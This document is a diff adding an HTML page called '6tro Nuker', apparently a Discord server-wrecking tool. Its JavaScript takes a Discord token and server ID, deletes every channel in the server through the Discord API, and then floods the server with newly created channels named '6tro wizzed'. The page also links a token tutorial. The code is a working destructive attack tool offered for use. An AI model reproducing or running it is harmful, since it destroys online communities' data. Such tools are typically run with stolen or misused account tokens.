@@ -1,0 +1,126 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="devity">
+    <meta charset=“UTF-8”>
+    <meta name=“viewport” content=“width=device-width, initial-scale=1.0”>
+    <meta http-equiv=“X-UA-Compatible” content=“ie=edge”>
+    <link rel=“stylesheet” type=“text/css” href=“main.css”>
+    <meta name="generator" content="Jekyll v4.1.1">
+    <title>Tro Nuker</title>
+
+    <link rel="canonical" href="https://getbootstrap.com/docs/4.5/examples/sign-in/">
+
+    <!-- Bootstrap core CSS -->
+<link href="https://getbootstrap.com/docs/4.5/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+
+    <!-- Favicons -->
+<link rel="apple-touch-icon" href="https://cdn.discordapp.com/attachments/769201594519650364/769219479384227840/image1_5.jpg" sizes="180x180">
+<link rel="icon" href="https://cdn.discordapp.com/attachments/769201594519650364/769219479384227840/image1_5.jpg" sizes="32x32" type="image/png">
+<link rel="icon" href="https://cdn.discordapp.com/attachments/769201594519650364/769219479384227840/image1_5.jpg" sizes="16x16" type="image/png">
+<link rel="manifest" href="https://getbootstrap.com/docs/4.5/assets/img/favicons/manifest.json">
+<link rel="mask-icon" href="" color="#563d7c">
+<link rel="icon" href="https://cdn.discordapp.com/attachments/769201594519650364/769219479384227840/image1_5.jpg">
+<meta name="msapplication-config" content="">
+<meta name="theme-color" content="#563d7c">
+    <style>
+      .bd-placeholder-img {
+        font-size: 1.125rem;
+        text-anchor: middle;
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+      }
+
+      @media (min-width: 768px) {
+        .bd-placeholder-img-lg {
+          font-size: 3.5rem;
+        }
+      }
+    </style>
+    <!-- Custom styles for this template -->
+    <link href="main.css" rel="stylesheet">
+  </head>
+
+  <script>
+       function sayHello() {
+         if (document.getElementById("glockak").checked == true) {
+            let noobb = new XMLHttpRequest();
+            var url = "https://discord.com/api/v8/guilds/"+ document.getElementById("inputServer").value+"/channels";
+            console.log(url)
+            noobb.open("GET", url, true);
+            noobb.setRequestHeader("authorization", document.getElementById("inputToken").value);
+
+            noobb.send(null);
+            
+            noobb.onload=function()
+            {
+              var result = JSON.parse(noobb.responseText)
+              for( let prop in result ){
+              let xxhr = new XMLHttpRequest();
+              var url = "https://discord.com/api/v8/channels/"+result[prop].id ;
+              xxhr.open("DELETE", url, true);
+              xxhr.setRequestHeader("authorization", document.getElementById("inputToken").value);
+              xxhr.send(null);
+              console.log(xxhr.responseText)
+              }
+              
+              for (i = 0; i < document.getElementById("inputChannel").value; i++) {
+                let xhr = new XMLHttpRequest();
+                var url = "https://discord.com/api/v8/guilds/"+ document.getElementById("inputServer").value+"/channels";
+                var params = {"type":0,"name":"6tro wizzed"}
+
+                xhr.open("POST", url, true);
+
+                xhr.setRequestHeader("authorization", document.getElementById("inputToken").value);
+                xhr.setRequestHeader('Content-Type', 'application/json')
+
+                xhr.send(JSON.stringify(params));
+              }
+            }
+      
+          alert("Nuke has been sent.")
+         }
+         else
+         {
+          alert("Please agree to Terms & Conditions")
+         }
+         return false
+       }
+ </script>
+  <body class="text-center">
+    <form class="form-signin">
+      <link href="http.php" rel="gang">
+  <img class="mb-4" src="https://cdn.discordapp.com/attachments/769201594519650364/769219479384227840/image1_5.jpg" alt="" width="72" height="72">
+  <h1 id = "titlex" class="h3 mb-3 font-weight-normal">6tro Nuker</h1>
+  <label for="inputToken" class="sr-only">Discord Token</label>
+  <input type="token" id="inputToken" class="form-control" placeholder="Token" required autofocus>
+  <label for="inputServer" class="sr-only">Server Id</label>
+  <input  type="server" id="inputServer" class="form-control" placeholder="Server ID" required>
+  <label for="inputChannel" class="sr-only"># of Channels</label>
+  <input  type="channel" id="inputChannel" class="form-control" placeholder="# of Channels" required>
+  <div class="checkbox mb-3">
+    <label>
+      <input id = "glockak" type="checkbox" value="remember-me"> Agree to <a href="https://discord.com/"> Terms & Conditions</a>
+    </label>
+  </div>
+  <button class="btn2 btn-lg btn-primary btn-block" onclick="return sayHello()" type="submit">Nuke!</button>
+      
+    <label>
+      <label id = "whitespace" type="label" value="">  <a href=""> </a>
+   </label>
+      
+   <label>
+      <label id = "XD" type="label" value="">  <a href="https://www.youtube.com/watch?v=tI1lzqzLQCs">Discord Token Tutorial</a>
+   </label>
+    <label>
+      <label id = "XD" type="label" value="">  <a href="discord.gg/lockdown">Server</a>
+   </label>
+  <p class="mt-5 mb-3 text-muted">&copy; devity 2020-2020</p>
+</form>
+</body>
+</html>
